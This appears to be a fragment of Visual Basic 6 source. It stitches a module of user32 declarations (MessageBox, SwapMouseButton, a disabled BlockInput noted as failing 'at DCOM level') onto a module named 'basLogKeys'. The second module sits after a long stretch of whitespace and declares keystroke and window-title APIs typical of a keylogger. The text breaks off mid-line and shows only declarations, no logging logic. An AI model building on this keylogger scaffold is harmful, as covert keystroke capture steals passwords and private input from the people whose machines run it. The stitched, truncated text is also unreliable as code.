'' asynchronus msgbox ''''''''''''''''
Public Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long

Public Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long

'''' API to Block Mouse and Keyboard not working at DCOM level   ''''
'Public Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''               some structures     ''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Public Type POINTAPI
  x As Long
  Y As Long
End Type


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Attribute VB_Name = "basLogKeys"
Option Explicit

Public Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Public CurrentWindow As String
Public Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Dec